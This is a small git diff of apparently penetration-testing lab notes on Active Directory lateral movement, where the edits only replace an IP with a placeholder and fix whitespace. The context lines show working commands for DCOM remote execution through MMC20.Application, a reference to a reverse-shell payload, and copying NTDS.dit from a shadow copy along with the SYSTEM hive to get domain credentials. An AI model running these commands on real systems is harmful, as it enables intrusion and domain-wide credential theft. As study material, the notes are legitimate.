@@ -1329,7 +1329,7 @@ Login to DC
 - DCOM
   - CLIENT74 (Jen) to FILES04
   - From an elevated PowerShell, instantiate a remote MMC 2.0 application by specifying the target IP of FILES04  
-    `$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))`  
+    `$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","<target>"))`  
   - Execute a command on the remote DCOM object  
     `$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")`
   - Adding a reverse-shell as a DCOM payload on CLIENT74  
@@ -1378,7 +1378,7 @@ AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")`
   2. create shadow copy by note down the generated shadow copy device name  
      `vshadow.exe -nw -p C:`  
      `\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1`  
-  4. Copy the NTDS Database from the Shadow Copy
+  4. Copy the NTDS Database from the Shadow Copy  
      `copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\ntds.dit.bak`  
   6. Dump the SYSTEM Hive from the Registry  
      `reg save HKLM\SYSTEM C:\system.bak`  
